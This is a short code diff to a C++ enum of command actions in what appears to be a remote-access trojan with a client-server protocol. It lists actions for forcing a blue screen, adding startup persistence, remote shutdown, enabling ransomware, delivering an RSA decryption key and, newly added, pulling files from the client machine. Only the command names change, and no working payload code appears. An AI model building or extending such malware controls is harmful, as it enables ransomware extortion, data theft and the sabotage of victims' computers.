@@ -39,16 +39,17 @@ enum Action {
     kNone,
     kOpenRemoteProcess,
     kClientWantsToDisconnect,  
-    kKillClient,        // forcefully disconnect the client from the server
+    kKillClient,         // forcefully disconnect the client from the server
     kPingClient,
     kKeepAlive,
-    kRemoteBSOD,        // cause a blue screen of death
-    kAddToStartup,      // add a program file path to startup registry
-    kRemoteShutdown,    // shut down the client machine
-    kRansomwareEnable,  // dangerous, enable ransomware on client machine
+    kRemoteBSOD,         // cause a blue screen of death
+    kAddToStartup,       // add a program file path to startup registry
+    kRemoteShutdown,     // shut down the client machine
+    kRansomwareEnable,   // dangerous, enable ransomware on client machine
     kSetAsDecryptionKey, // Tell the client that the data in buffer is der format of the private rsa key
-    kRunDecryptor,      // run the ransomware decryptor if the private key is on the machine
-    kAddClientToServer, // client wants to be added to tcp server
+    kRunDecryptor,       // run the ransomware decryptor if the private key is on the machine
+    kAddClientToServer,  // client wants to be added to tcp server
+    kReceiveFileFromClient, // server wants to get a file from client remote hsot
 };
 
 enum SocketTypes {
